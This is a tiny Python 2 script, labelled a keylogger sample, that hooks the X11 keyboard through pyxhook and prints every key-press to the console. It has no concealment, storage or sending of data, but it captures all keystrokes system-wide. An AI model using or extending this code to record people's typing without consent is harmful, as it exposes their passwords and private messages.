# -*- coding: utf-8 -*-
# keylogger_sample.py
import pyxhook

def OnKeyPress(event):
    print event

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
